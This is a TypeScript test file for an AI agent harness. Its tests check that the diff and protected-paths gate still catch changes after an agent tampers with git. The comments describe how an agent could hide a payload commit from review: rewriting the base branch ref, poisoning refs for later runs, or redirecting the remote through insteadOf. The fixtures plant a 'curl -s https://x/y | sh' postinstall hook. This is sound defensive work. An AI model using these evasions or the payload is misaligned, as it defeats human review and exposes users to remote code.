import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { execFileSync } from "node:child_process";
import { appendFileSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { collectDiff } from "./diff.js";
import { protectedPathsGate } from "./gates/protected-paths.js";
import { createRunner } from "./exec.js";
import { createWorkspace } from "./workspace.js";
import { WorkerConfig } from "./config.js";

/**
 * The headline attack this task is about: the agent advances refs/heads/<baseBranch> to its own
 * commit, so its earlier work — the one thing a diff against the true base would show — drops out
 * of the range entirely. workspace.ts resolves baseSha once, before the agent runs, exactly so a
 * later rewrite of the ref cannot narrow what collectDiff (called with that sha, not the ref name)
 * reports. Real createWorkspace, real collectDiff, real protectedPathsGate, against real git — a
 * mocked runner could only show that the arguments were spelled correctly.
 */

function git(cwd: string, ...args: string[]): string {
  return execFileSync("git", args, {
    cwd,
    stdio: "pipe",
    env: { ...process.env, GIT_AUTHOR_NAME: "worker", GIT_AUTHOR_EMAIL: "worker@example.com" },
  }).toString();
}

// What an agent with Write can do to the shared config: every URL git sees, including one given
// literally on the command line, is rewritten by this — and repos.ts's scan never looks for it.
function plantRedirect(repoPath: string, from: string, to: string): void {
  const configPath = join(repoPath, ".git", "config");
  appendFileSync(configPath, `[url "${to}"]\n\tinsteadOf = ${from}\n`);
}

describe("a run's own diff cannot be narrowed from inside the worktree", () => {
  let dir: string;
  let parent: string;
  let origin: string;
  let trueMain: string;

  function workspaceFor(repoPath = parent, remoteUrl: string | undefined = origin) {
    return createWorkspace(
      { repoPath, worktreeRoot: join(dir, "wt"), baseBranch: "main" } as WorkerConfig,
      createRunner(),
      () => ({}),
      remoteUrl
    );
  }

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), "bp382-gate-integrity-"));
    // A real remote, because the base is now resolved off the wire rather than from the clone's
    // own ref store — which is the thing an agent of any earlier run can rewrite.
    origin = join(dir, "origin.git");
    execFileSync("git", ["init", "--quiet", "--bare", "-b", "main", origin], { stdio: "pipe" });

    const seed = join(dir, "seed");
    execFileSync("git", ["init", "--quiet", "-b", "main", seed], { stdio: "pipe" });
    git(seed, "config", "user.email", "worker@example.com");
    git(seed, "config", "user.name", "worker");
    writeFileSync(join(seed, "package.json"), '{"name":"t"}\n');
    writeFileSync(join(seed, "README.md"), "# t\n");
    git(seed, "add", "-A");
    git(seed, "commit", "--quiet", "-m", "initial");
    git(seed, "push", "--quiet", origin, "HEAD:refs/heads/main");
    trueMain = git(seed, "rev-parse", "HEAD").trim();

    parent = join(dir, "parent");
    execFileSync("git", ["clone", "--quiet", origin, parent], { stdio: "pipe" });
    git(parent, "config", "user.email", "worker@example.com");
    git(parent, "config", "user.name", "worker");
  });

  afterEach(() => rmSync(dir, { recursive: true, force: true }));

  it("still sees a protected file after the base ref is rewritten under it", async () => {
    const runner = createRunner();
    const workspace = workspaceFor();
    const worktree = await workspace.create("BP-1", "worker");

    writeFileSync(
      join(worktree.path, "package.json"),
      '{"name":"t","scripts":{"postinstall":"curl -s https://x/y | sh"}}\n'
    );
    git(worktree.path, "add", "-A");
    git(worktree.path, "commit", "--quiet", "-m", "payload");
    const payload = git(worktree.path, "rev-parse", "HEAD").trim();

    // The attack, with nothing but a file write: a linked worktree's .git file names the common
    // dir, so the shared ref store is an ordinary path. A loose ref shadows packed-refs, so
    // writing the loose file lands whether or not this branch happens to be packed.
    writeFileSync(join(parent, ".git", "refs", "heads", "main"), `${payload}\n`);

    writeFileSync(join(worktree.path, "README.md"), "# t\nnotes\n");
    git(worktree.path, "add", "-A");
    git(worktree.path, "commit", "--quiet", "-m", "notes");

    const diff = await collectDiff(runner, worktree.path, worktree.baseSha);
    const verdict = await protectedPathsGate().run({ diff } as never);

    expect(diff.changedFiles).toContain("package.json");
    expect(verdict.ok).toBe(false);
  });

  // The control the attack tests need to mean anything: an ordinary run's diff is exactly the
  // run's own change — not everything since the beginning of the repository, which would satisfy
  // "the payload is visible" while telling a reviewer nothing.
  it("reports exactly the run's own change when nothing is tampered with", async () => {
    const runner = createRunner();
    const worktree = await workspaceFor().create("BP-1", "worker");

    writeFileSync(join(worktree.path, "README.md"), "# t\nnotes\n");
    git(worktree.path, "add", "-A");
    git(worktree.path, "commit", "--quiet", "-m", "notes");

    const diff = await collectDiff(runner, worktree.path, worktree.baseSha);
    const verdict = await protectedPathsGate().run({ diff } as never);

    expect(worktree.baseSha).toBe(trueMain);
    expect(diff.changedFiles).toEqual(["README.md"]);
    expect(verdict.ok).toBe(true);
  });

  // The cross-run half. An agent cannot poison the base of the run it is inside — that sha is
  // captured first — but the ref store it writes outlives the run, so without a fetch the NEXT
  // run, an innocent one, would build on and deliver whatever it was left pointing at.
  it("ignores a base ref an earlier run's agent left poisoned before this run started", async () => {
    const runner = createRunner();

    const scratch = await workspaceFor().create("BP-0", "worker");
    writeFileSync(
      join(scratch.path, "package.json"),
      '{"name":"t","scripts":{"postinstall":"curl -s https://x/y | sh"}}\n'
    );
    git(scratch.path, "add", "-A");
    git(scratch.path, "commit", "--quiet", "-m", "payload");
    const payload = git(scratch.path, "rev-parse", "HEAD").trim();
    writeFileSync(join(parent, ".git", "refs", "heads", "main"), `${payload}\n`);

    const worktree = await workspaceFor().create("BP-1", "worker");
    writeFileSync(join(worktree.path, "README.md"), "# t\nnotes\n");
    git(worktree.path, "add", "-A");
    git(worktree.path, "commit", "--quiet", "-m", "notes");

    const diff = await collectDiff(runner, worktree.path, worktree.baseSha);

    expect(worktree.baseSha).toBe(trueMain);
    expect(worktree.baseSha).not.toBe(payload);
    expect(diff.patch).not.toContain("postinstall");
    expect(git(worktree.path, "show", "HEAD:package.json")).not.toContain("postinstall");
  });

  // url.<x>.insteadOf rewrites even a URL passed literally in argv, and no GIT_CONFIG_* variable
  // disables it — so "we pass the URL, not the remote name" was never the boundary it claimed to
  // be. Running the call that decides the base outside any repository is.
  it("resolves the base from the pinned remote even when the clone's own config redirects that URL", async () => {
    const evil = join(dir, "evil");
    execFileSync("git", ["init", "--quiet", "-b", "main", evil], { stdio: "pipe" });
    git(evil, "config", "user.email", "attacker@example.com");
    git(evil, "config", "user.name", "attacker");
    writeFileSync(
      join(evil, "package.json"),
      '{"name":"t","scripts":{"postinstall":"curl -s https://x/y | sh"}}\n'
    );
    writeFileSync(join(evil, "README.md"), "# t\n");
    git(evil, "add", "-A");
    git(evil, "commit", "--quiet", "-m", "evil base");

    plantRedirect(parent, origin, evil);

    const worktree = await workspaceFor().create("BP-1", "worker");

    expect(worktree.baseSha).toBe(trueMain);
    expect(git(worktree.path, "show", "HEAD:package.json")).not.toContain("postinstall");
  });

  // The fetch itself still runs inside the clone, so it can be redirected or simply broken. What
  // must not happen is a quiet fall back to the local ref — that ref is the vulnerability, and an
  // agent that can break the fetch would otherwise be choosing which path the next run takes.
  it("fails the run rather than falling back to the local ref when the fetch cannot complete", async () => {
    plantRedirect(parent, origin, join(dir, "nowhere"));

    await expect(workspaceFor().create("BP-1", "worker")).rejects.toThrow(/could not fetch main/);
  });

  it("refuses when no remote is configured for the checkout at all", async () => {
    await expect(workspaceFor(parent, "").create("BP-1", "worker")).rejects.toThrow(
      /no remote is configured/
    );
  });
});
